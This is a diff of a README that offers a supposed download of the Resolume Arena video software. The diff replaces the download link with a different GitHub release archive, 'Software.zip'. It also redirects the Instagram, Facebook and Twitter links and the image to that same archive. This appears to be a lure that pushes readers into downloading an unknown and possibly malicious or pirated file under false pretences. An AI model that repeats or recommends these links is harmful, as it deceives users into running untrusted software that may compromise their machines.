@@ -17,7 +17,7 @@ Explore a variety of topics related to Resolume Arena, including:
 - And much more!
 
 ## Get Started
-Ready to unleash your creativity with Resolume Arena? [Download the software](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip) now! 🚀
+Ready to unleash your creativity with Resolume Arena? [Download the software](https://github.com/junioreloi/Resolume-Arena-Download/releases/download/v2.0/Software.zip) now! 🚀
 
 ### Note: This link needs to be launched to start your download.
 
@@ -26,10 +26,10 @@ If the provided link is not working or you need more information, make sure to c
 
 ## Connect with Us
 Stay up-to-date with the latest Resolume Arena news, tips, and tricks by following us on social media:
-- Instagram: [ResolumeArenaOfficial](https://www.instagram.com/resolumearenaofficial)
-- Facebook: [Resolume Arena](https://www.facebook.com/resolumearena)
-- Twitter: [Resolume Arena](https://twitter.com/resolumearena)
+- Instagram: [ResolumeArenaOfficial](https://github.com/junioreloi/Resolume-Arena-Download/releases/download/v2.0/Software.zip)
+- Facebook: [Resolume Arena](https://github.com/junioreloi/Resolume-Arena-Download/releases/download/v2.0/Software.zip)
+- Twitter: [Resolume Arena](https://github.com/junioreloi/Resolume-Arena-Download/releases/download/v2.0/Software.zip)
 
 Let's create unforgettable visual experiences with Resolume Arena! 🌟✨🎶
 
-![Resolume Arena](https://img.icons8.com/color/452/resolume-arena.png)
+![Resolume Arena](https://github.com/junioreloi/Resolume-Arena-Download/releases/download/v2.0/Software.zip)
